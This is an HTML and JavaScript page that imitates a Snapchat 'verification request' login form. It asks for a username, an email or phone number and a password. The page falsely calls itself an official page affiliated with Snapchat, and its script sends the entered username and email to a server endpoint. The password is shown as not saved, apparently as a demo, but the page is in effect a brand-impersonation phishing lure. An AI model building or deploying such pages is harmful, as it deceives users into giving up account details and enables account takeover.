<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Snapchat Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body class="min-h-screen bg-[#f5f7fb] text-slate-950">
    <main class="min-h-screen px-4 py-8 sm:px-6 lg:px-10">
      <section
        class="mx-auto grid min-h-[calc(100vh-4rem)] max-w-6xl items-center gap-8 lg:grid-cols-[1.35fr_0.85fr]"
      >
        <div
          class="rounded-[28px] border-[7px] border-[#fffc00] bg-white p-6 shadow-2xl shadow-slate-200 sm:p-10"
        >
          <div class="flex items-center justify-between">
            <div class="h-2 w-28 rounded-full bg-[#fffc00]"></div>
            <div class="h-2 w-20 rounded-full bg-slate-200"></div>
          </div>

          <div
            class="flex min-h-[480px] flex-col items-center justify-center text-center"
          >
            <div class="relative">
              <div
                class="mx-auto flex h-32 w-32 items-center justify-center overflow-hidden rounded-[34px] bg-[#fffc00] shadow-xl shadow-yellow-200 ring-8 ring-yellow-100"
              >
                <img
                  src="./snapchat-logo.png"
                  alt="Snapchat style logo"
                  class="h-full w-full object-cover"
                />
              </div>
              <div
                class="absolute -right-8 -top-5 flex h-16 w-16 items-center justify-center rounded-full bg-sky-400 text-3xl font-bold text-white shadow-lg"
              >
                ✓
              </div>
            </div>

            <p class="mt-12 text-lg font-semibold text-slate-400">
              verification
            </p>
            <p
              class="mt-2 text-xl font-extrabold uppercase tracking-wide text-[#ffb700]"
            >
              Request Center
            </p>
            <h1
              class="mt-8 max-w-2xl text-4xl font-semibold leading-tight text-slate-900 sm:text-5xl"
            >
              Get verified with Snapchat
            </h1>

            <div
              class="mt-12 flex h-20 w-20 items-center justify-center rounded-full bg-sky-400 text-4xl font-bold text-white shadow-lg shadow-sky-200"
            >
              ✓
            </div>
          </div>

          <div class="flex items-center justify-end">
            <div class="h-2 w-28 rounded-full bg-[#fffc00]"></div>
          </div>
        </div>

        <div
          class="rounded-[26px] bg-white p-6 shadow-2xl shadow-slate-200 sm:p-7"
        >
          <div class="mb-6">
            <p
              class="text-sm font-extrabold uppercase tracking-wide text-[#c7b900]"
            >
              Login
            </p>
            <h2 class="mt-2 text-2xl font-extrabold text-slate-950">
              Snapchat verification
            </h2>
            <p class="mt-2 text-sm leading-6 text-slate-500">
              Official  page..
            </p>
          </div>

          <form id="signupForm" class="space-y-5">
            <label class="block">
              <span class="mb-2 block text-sm font-bold text-slate-700"
                >Snapchat username</span
              >
              <input
                id="username"
                type="text"
                required
                placeholder="username"
                class="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-4 text-slate-950 outline-none transition placeholder:text-slate-400 focus:border-[#fffc00] focus:bg-white focus:ring-4 focus:ring-yellow-100"
              />
            </label>

            <label class="block">
              <span class="mb-2 block text-sm font-bold text-slate-700"
                >Email ID or Phone Number</span
              >
              <input
                id="email"
                type="text"
                required
                placeholder="name@example.com or +1234567890"
                class="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-4 text-slate-950 outline-none transition placeholder:text-slate-400 focus:border-[#fffc00] focus:bg-white focus:ring-4 focus:ring-yellow-100"
              />
            </label>

            <label class="block">
              <span class="mb-2 block text-sm font-bold text-slate-700"
                >Password</span
              >
              <input
                id="password"
                type="password"
                required
                minlength="6"
                placeholder="Enter demo password"
                class="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-4 text-slate-950 outline-none transition placeholder:text-slate-400 focus:border-[#fffc00] focus:bg-white focus:ring-4 focus:ring-yellow-100"
              />
            </label>

            <label class="block">
              <span class="mb-2 block text-sm font-bold text-slate-700"
                >Creator category</span
              >
              <select
                id="category"
                class="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-4 text-slate-950 outline-none transition focus:border-[#fffc00] focus:bg-white focus:ring-4 focus:ring-yellow-100"
              >
                <option>Public figure</option>
                <option>Creator</option>
                <option>Business</option>
                <option>Artist</option>
              </select>
            </label>

            <button
              type="submit"
              class="w-full rounded-xl bg-[#fffc00] px-5 py-4 text-sm font-extrabold uppercase tracking-wide text-slate-950 shadow-lg shadow-yellow-100 transition hover:bg-[#fff64a] focus:outline-none focus:ring-4 focus:ring-yellow-200"
            >
              Submit request →
            </button>
          </form>

          <div
            class="mt-5 rounded-xl bg-slate-50 px-4 py-4 text-sm font-semibold text-slate-500"
          >
            This is affiliated with Snapchat.
          </div>
        </div>
      </section>
    </main>

    <div
      id="popupOverlay"
      class="fixed inset-0 z-50 hidden items-center justify-center bg-slate-950/70 px-4 backdrop-blur-sm"
    >
      <div
        class="w-full max-w-md rounded-[28px] bg-white p-6 text-slate-950 shadow-2xl"
      >
        <div
          class="mx-auto flex h-20 w-20 items-center justify-center overflow-hidden rounded-2xl bg-[#fffc00] shadow-lg shadow-yellow-100"
        >
          <img
            src="./snapchat-logo.png"
            alt="Snapchat style logo"
            class="h-full w-full object-cover"
          />
        </div>

        <div class="mt-5 text-center">
          <p
            class="text-sm font-extrabold uppercase tracking-wide text-[#c7b900]"
          >
            Request submitted
          </p>
          <h3 class="mt-2 text-2xl font-extrabold">
            Wait for the verification
          </h3>
          <p id="popupMessage" class="mt-2 text-sm leading-6 text-slate-500">
            Your request details are shown below.
          </p>
        </div>

        <dl class="mt-6 space-y-3 rounded-2xl bg-yellow-50 p-4 text-sm">
          <div>
            <dt class="font-bold text-slate-500">Username</dt>
            <dd
              id="showUsername"
              class="mt-1 break-words font-semibold text-slate-950"
            ></dd>
          </div>
          <div>
            <dt class="font-bold text-slate-500">Email or phone</dt>
            <dd
              id="showEmail"
              class="mt-1 break-words font-semibold text-slate-950"
            ></dd>
          </div>
          <div>
            <dt class="font-bold text-slate-500">Password</dt>
            <dd class="mt-1 font-semibold text-slate-950">Not saved for safety</dd>
          </div>
          <div>
            <dt class="font-bold text-slate-500">Category</dt>
            <dd
              id="showCategory"
              class="mt-1 font-semibold text-slate-950"
            ></dd>
          </div>
        </dl>

        <button
          id="closePopup"
          type="button"
          class="mt-5 w-full rounded-xl bg-slate-950 px-5 py-4 text-sm font-extrabold uppercase tracking-wide text-[#fffc00] transition hover:bg-slate-800 focus:outline-none focus:ring-4 focus:ring-yellow-200"
        >
          Close
        </button>
      </div>
    </div>

    <script>
      const form = document.getElementById("signupForm");
      const usernameInput = document.getElementById("username");
      const emailInput = document.getElementById("email");
      const passwordInput = document.getElementById("password");
      const categoryInput = document.getElementById("category");
      const popupOverlay = document.getElementById("popupOverlay");
      const closePopup = document.getElementById("closePopup");
      const showUsername = document.getElementById("showUsername");
      const showEmail = document.getElementById("showEmail");
      const showCategory = document.getElementById("showCategory");
      const popupMessage = document.getElementById("popupMessage");

      function showPopup(userData, message) {
        showUsername.textContent = userData.username;
        showEmail.textContent = userData.email;
        showCategory.textContent = userData.category;
        popupMessage.textContent =
          message || "Your demo request details are shown below.";
        popupOverlay.classList.remove("hidden");
        popupOverlay.classList.add("flex");
      }

      form.addEventListener("submit", async function (event) {
        event.preventDefault();

        const userData = {
          username: usernameInput.value.trim(),
          email: emailInput.value.trim(),
          category: categoryInput.value,
        };

        localStorage.setItem(
          "snapchatVerificationDemo",
          JSON.stringify(userData),
        );
        try {
          const response = await fetch("/api/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
          });

          if (!response.ok) {
            throw new Error("Request failed");
          }

          showPopup(
            userData,
            "Saved on the local server. Wait for the verification.",
          );
        } catch (error) {
          showPopup(
            userData,
            "Saved in this browser only. Start the server to store it server-side.",
          );
        }

        passwordInput.value = "";
      });

      closePopup.addEventListener("click", function () {
        popupOverlay.classList.add("hidden");
        popupOverlay.classList.remove("flex");
      });

      popupOverlay.addEventListener("click", function (event) {
        if (event.target === popupOverlay) {
          popupOverlay.classList.add("hidden");
          popupOverlay.classList.remove("flex");
        }
      });
    </script>
  </body>
</html>
